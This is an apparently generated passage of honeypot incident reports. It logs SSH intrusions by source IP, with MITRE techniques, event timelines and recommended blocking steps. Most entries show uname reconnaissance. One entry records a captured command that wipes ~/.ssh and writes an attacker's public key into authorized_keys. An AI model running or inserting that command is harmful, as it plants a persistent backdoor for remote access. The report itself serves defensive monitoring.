| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 13:35:22` | `cowrie.session.connect` |
| `2026-08-11 13:35:22` | `cowrie.client.version` |
| `2026-08-11 13:35:22` | `cowrie.client.kex` |
| `2026-08-11 13:35:22` | `cowrie.login.success` |
| `2026-08-11 13:35:23` | `cowrie.session.params` |
| `2026-08-11 13:35:23` | `cowrie.command.input` |
| `2026-08-11 13:35:23` | `cowrie.log.closed` |
| `2026-08-11 13:35:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5619a5f41ee5

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-11 13:35 |
| **Last Seen** | 2026-08-11 13:35 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 13:35:23` | `cowrie.session.connect` |
| `2026-08-11 13:35:23` | `cowrie.client.version` |
| `2026-08-11 13:35:23` | `cowrie.client.kex` |
| `2026-08-11 13:35:25` | `cowrie.login.success` |
| `2026-08-11 13:35:26` | `cowrie.session.params` |
| `2026-08-11 13:35:26` | `cowrie.command.input` |
| `2026-08-11 13:35:26` | `cowrie.command.input` |
| `2026-08-11 13:35:26` | `cowrie.command.input` |
| `2026-08-11 13:35:26` | `cowrie.command.input` |
| `2026-08-11 13:35:26` | `cowrie.command.input` |
| `2026-08-11 13:35:26` | `cowrie.command.success` |
| `2026-08-11 13:35:26` | `cowrie.command.input` |
| `2026-08-11 13:35:26` | `cowrie.command.input` |
| `2026-08-11 13:35:26` | `cowrie.command.input` |
| `2026-08-11 13:35:26` | `cowrie.command.input` |
| `2026-08-11 13:35:27` | `cowrie.log.closed` |
| `2026-08-11 13:35:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b05ed5edbfd

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-11 13:36 |
| **Last Seen** | 2026-08-11 13:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 13:36:52` | `cowrie.session.connect` |
| `2026-08-11 13:36:52` | `cowrie.client.version` |
| `2026-08-11 13:36:52` | `cowrie.client.kex` |
| `2026-08-11 13:36:53` | `cowrie.login.success` |
| `2026-08-11 13:36:54` | `cowrie.session.params` |
| `2026-08-11 13:36:54` | `cowrie.command.input` |
| `2026-08-11 13:36:54` | `cowrie.log.closed` |
| `2026-08-11 13:36:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-37bbc79e0f57

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-11 13:37 |
| **Last Seen** | 2026-08-11 13:37 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 13:37:10` | `cowrie.session.connect` |
| `2026-08-11 13:37:10` | `cowrie.client.version` |
| `2026-08-11 13:37:10` | `cowrie.client.kex` |
| `2026-08-11 13:37:11` | `cowrie.login.success` |
| `2026-08-11 13:37:12` | `cowrie.session.params` |
| `2026-08-11 13:37:12` | `cowrie.command.input` |
| `2026-08-11 13:37:12` | `cowrie.command.input` |
| `2026-08-11 13:37:12` | `cowrie.command.input` |
| `2026-08-11 13:37:12` | `cowrie.command.input` |
| `2026-08-11 13:37:12` | `cowrie.command.input` |
| `2026-08-11 13:37:12` | `cowrie.command.success` |
| `2026-08-11 13:37:12` | `cowrie.command.input` |
| `2026-08-11 13:37:12` | `cowrie.command.input` |
| `2026-08-11 13:37:12` | `cowrie.command.input` |
| `2026-08-11 13:37:12` | `cowrie.command.input` |
| `2026-08-11 13:37:13` | `cowrie.log.closed` |
| `2026-08-11 13:37:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ac74376d138

| Field | Detail |
|---|---|
| **Source IP** | `49.124.153[.]57` |
| **First Seen** | 2026-08-11 13:37 |
| **Last Seen** | 2026-08-11 13:38 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 13:37:51` | `cowrie.session.connect` |
| `2026-08-11 13:37:52` | `cowrie.client.version` |
| `2026-08-11 13:37:52` | `cowrie.client.kex` |
| `2026-08-11 13:37:54` | `cowrie.login.success` |
| `2026-08-11 13:37:55` | `cowrie.direct-tcpip.request` |
| `2026-08-11 13:38:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.124.153[.]57` to AbuseIPDB if not already reported
- [ ] Block `49.124.153[.]57` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2559369126c3

| Field | Detail |
|---|---|
| **Source IP** | `200.222.71[.]218` |
| **First Seen** | 2026-08-11 13:38 |
| **Last Seen** | 2026-08-11 13:38 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 13:38:00` | `cowrie.session.connect` |
| `2026-08-11 13:38:00` | `cowrie.client.version` |
| `2026-08-11 13:38:00` | `cowrie.client.kex` |
| `2026-08-11 13:38:02` | `cowrie.login.success` |
| `2026-08-11 13:38:02` | `cowrie.direct-tcpip.request` |
| `2026-08-11 13:38:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.222.71[.]218` to AbuseIPDB if not already reported
- [ ] Block `200.222.71[.]218` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d85a5c70d9b8

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-11 13:38 |
| **Last Seen** | 2026-08-11 13:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 13:38:26` | `cowrie.session.connect` |
| `2026-08-11 13:38:26` | `cowrie.client.version` |
| `2026-08-11 13:38:26` | `cowrie.client.kex` |
| `2026-08-11 13:38:27` | `cowrie.login.success` |
| `2026-08-11 13:38:27` | `cowrie.session.params` |
| `2026-08-11 13:38:27` | `cowrie.command.input` |
| `2026-08-11 13:38:28` | `cowrie.log.closed` |
| `2026-08-11 13:38:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c4914056ddb

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-11 13:38 |
| **Last Seen** | 2026-08-11 13:39 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 13:38:58` | `cowrie.session.connect` |
| `2026-08-11 13:38:58` | `cowrie.client.version` |
| `2026-08-11 13:38:58` | `cowrie.client.kex` |
| `2026-08-11 13:38:59` | `cowrie.login.success` |
| `2026-08-11 13:39:00` | `cowrie.session.params` |
| `2026-08-11 13:39:00` | `cowrie.command.input` |
| `2026-08-11 13:39:00` | `cowrie.command.input` |
| `2026-08-11 13:39:00` | `cowrie.command.input` |
| `2026-08-11 13:39:00` | `cowrie.command.input` |
| `2026-08-11 13:39:00` | `cowrie.command.input` |
| `2026-08-11 13:39:00` | `cowrie.command.success` |
| `2026-08-11 13:39:00` | `cowrie.command.input` |
| `2026-08-11 13:39:00` | `cowrie.command.input` |
| `2026-08-11 13:39:00` | `cowrie.command.input` |
| `2026-08-11 13:39:00` | `cowrie.command.input` |
| `2026-08-11 13:39:01` | `cowrie.log.closed` |
| `2026-08-11 13:39:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bcc44d1a877f

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]183` |
| **First Seen** | 2026-08-11 13:39 |
| **Last Seen** | 2026-08-11 13:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 13:39:23` | `cowrie.session.connect` |
| `2026-08-11 13:39:23` | `cowrie.client.version` |
| `2026-08-11 13:39:23` | `cowrie.client.kex` |
| `2026-08-11 13:39:24` | `cowrie.login.success` |
| `2026-08-11 13:39:25` | `cowrie.session.params` |
| `2026-08-11 13:39:25` | `cowrie.command.input` |
| `2026-08-11 13:39:25` | `cowrie.log.closed` |
| `2026-08-11 13:39:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]183` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0161deff71c

| Field | Detail |
|---|---|
| **Source IP** | `106.75.26[.]244` |
| **First Seen** | 2026-08-11 13:39 |
| **Last Seen** | 2026-08-11 13:40 |
| **Session Duration** | 24s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 13:39:51` | `cowrie.session.connect` |
| `2026-08-11 13:39:52` | `cowrie.client.version` |
| `2026-08-11 13:39:52` | `cowrie.client.kex` |
| `2026-08-11 13:39:53` | `cowrie.login.success` |
| `2026-08-11 13:39:55` | `cowrie.session.params` |
| `2026-08-11 13:39:55` | `cowrie.command.input` |
| `2026-08-11 13:39:55` | `cowrie.command.failed` |
| `2026-08-11 13:39:56` | `cowrie.log.closed` |
| `2026-08-11 13:39:57` | `cowrie.session.params` |
| `2026-08-11 13:39:57` | `cowrie.command.input` |
| `2026-08-11 13:39:57` | `cowrie.session.file_download` |
| `2026-08-11 13:39:57` | `cowrie.log.closed` |
| `2026-08-11 13:40:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.75.26[.]244` to AbuseIPDB if not already reported
- [ ] Block `106.75.26[.]244` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-61704cf1738c

| Field | Detail |
|---|---|
| **Source IP** | `106.75.26[.]244` |
| **First Seen** | 2026-08-11 13:39 |
| **Last Seen** | 2026-08-11 13:40 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 13:39:57` | `cowrie.session.connect` |
| `2026-08-11 13:40:00` | `cowrie.client.version` |
| `2026-08-11 13:40:00` | `cowrie.client.kex` |
| `2026-08-11 13:40:01` | `cowrie.login.success` |
| `2026-08-11 13:40:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.75.26[.]244` to AbuseIPDB if not already reported
- [ ] Block `106.75.26[.]244` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4797b5a21e58

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-11 13:40 |
| **Last Seen** | 2026-08-11 13:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 13:40:09` | `cowrie.session.connect` |
| `2026-08-11 13:40:09` | `cowrie.client.version` |
| `2026-08-11 13:40:09` | `cowrie.client.kex` |
| `2026-08-11 13:40:09` | `cowrie.login.success` |
| `2026-08-11 13:40:10` | `cowrie.session.params` |
| `2026-08-11 13:40:10` | `cowrie.command.input` |
| `2026-08-11 13:40:10` | `cowrie.log.closed` |
| `2026-08-11 13:40:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-813ce8bbcb64

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-11 13:40 |
| **Last Seen** | 2026-08-11 13:40 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 13:40:53` | `cowrie.session.connect` |
| `2026-08-11 13:40:53` | `cowrie.client.version` |
| `2026-08-11 13:40:53` | `cowrie.client.kex` |
| `2026-08-11 13:40:54` | `cowrie.login.success` |
| `2026-08-11 13:40:55` | `cowrie.session.params` |
| `2026-08-11 13:40:55` | `cowrie.command.input` |
| `2026-08-11 13:40:55` | `cowrie.command.input` |
| `2026-08-11 13:40:55` | `cowrie.command.input` |
| `2026-08-11 13:40:55` | `cowrie.command.input` |
| `2026-08-11 13:40:55` | `cowrie.command.input` |
| `2026-08-11 13:40:55` | `cowrie.command.success` |
| `2026-08-11 13:40:55` | `cowrie.command.input` |
| `2026-08-11 13:40:55` | `cowrie.command.input` |
| `2026-08-11 13:40:55` | `cowrie.command.input` |
| `2026-08-11 13:40:55` | `cowrie.command.input` |
| `2026-08-11 13:40:55` | `cowrie.log.closed` |
| `2026-08-11 13:40:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-675e10236019

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-11 13:41 |
| **Last Seen** | 2026-08-11 13:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 13:41:48` | `cowrie.session.connect` |
| `2026-08-11 13:41:48` | `cowrie.client.version` |
| `2026-08-11 13:41:48` | `cowrie.client.kex` |
| `2026-08-11 13:41:49` | `cowrie.login.success` |
| `2026-08-11 13:41:49` | `cowrie.session.params` |
| `2026-08-11 13:41:49` | `cowrie.command.input` |
| `2026-08-11 13:41:50` | `cowrie.log.closed` |
| `2026-08-11 13:41:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fcdc82a98f35

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]183` |
| **First Seen** | 2026-08-11 13:42 |
| **Last Seen** | 2026-08-11 13:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 13:42:10` | `cowrie.session.connect` |
| `2026-08-11 13:42:10` | `cowrie.client.version` |
| `2026-08-11 13:42:10` | `cowrie.client.kex` |
| `2026-08-11 13:42:11` | `cowrie.login.success` |
| `2026-08-11 13:42:11` | `cowrie.session.params` |
| `2026-08-11 13:42:11` | `cowrie.command.input` |
| `2026-08-11 13:42:12` | `cowrie.log.closed` |
| `2026-08-11 13:42:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]183` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1c22f14468a

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-11 13:42 |
| **Last Seen** | 2026-08-11 13:42 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 13:42:47` | `cowrie.session.connect` |
| `2026-08-11 13:42:47` | `cowrie.client.version` |
| `2026-08-11 13:42:47` | `cowrie.client.kex` |
| `2026-08-11 13:42:48` | `cowrie.login.success` |
| `2026-08-11 13:42:49` | `cowrie.session.params` |
| `2026-08-11 13:42:49` | `cowrie.command.input` |
| `2026-08-11 13:42:49` | `cowrie.command.input` |
| `2026-08-11 13:42:49` | `cowrie.command.input` |
| `2026-08-11 13:42:49` | `cowrie.command.input` |
| `2026-08-11 13:42:49` | `cowrie.command.input` |
| `2026-08-11 13:42:49` | `cowrie.command.success` |
| `2026-08-11 13:42:49` | `cowrie.command.input` |
| `2026-08-11 13:42:49` | `cowrie.command.input` |
| `2026-08-11 13:42:49` | `cowrie.command.input` |
| `2026-08-11 13:42:49` | `cowrie.command.input` |
| `2026-08-11 13:42:49` | `cowrie.log.closed` |
| `2026-08-11 13:42:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23ccfbef427f

| Field | Detail |
|---|---|
| **Source IP** | `197.251.249[.]117` |
| **First Seen** | 2026-08-11 13:43 |
| **Last Seen** | 2026-08-11 13:43 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 13:43:06` | `cowrie.session.connect` |
| `2026-08-11 13:43:07` | `cowrie.client.version` |
| `2026-08-11 13:43:07` | `cowrie.client.kex` |
| `2026-08-11 13:43:08` | `cowrie.login.success` |
| `2026-08-11 13:43:09` | `cowrie.direct-tcpip.request` |
| `2026-08-11 13:43:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.251.249[.]117` to AbuseIPDB if not already reported
- [ ] Block `197.251.249[.]117` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f9975c71767

| Field | Detail |
|---|---|
| **Source IP** | `222.236.155[.]146` |
| **First Seen** | 2026-08-11 13:43 |
| **Last Seen** | 2026-08-11 13:43 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 13:43:14` | `cowrie.session.connect` |
| `2026-08-11 13:43:15` | `cowrie.client.version` |
| `2026-08-11 13:43:15` | `cowrie.client.kex` |
| `2026-08-11 13:43:17` | `cowrie.login.success` |
| `2026-08-11 13:43:18` | `cowrie.direct-tcpip.request` |
| `2026-08-11 13:43:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.236.155[.]146` to AbuseIPDB if not already reported
- [ ] Block `222.236.155[.]146` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d9b130213349

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-11 13:43 |
| **Last Seen** | 2026-08-11 13:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 13:43:23` | `cowrie.session.connect` |
| `2026-08-11 13:43:23` | `cowrie.client.version` |
| `2026-08-11 13:43:23` | `cowrie.client.kex` |
| `2026-08-11 13:43:23` | `cowrie.login.success` |
| `2026-08-11 13:43:24` | `cowrie.session.params` |
| `2026-08-11 13:43:24` | `cowrie.command.input` |
| `2026-08-11 13:43:24` | `cowrie.log.closed` |
| `2026-08-11 13:43:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-99f0ae854372

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-11 13:44 |
| **Last Seen** | 2026-08-11 13:44 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
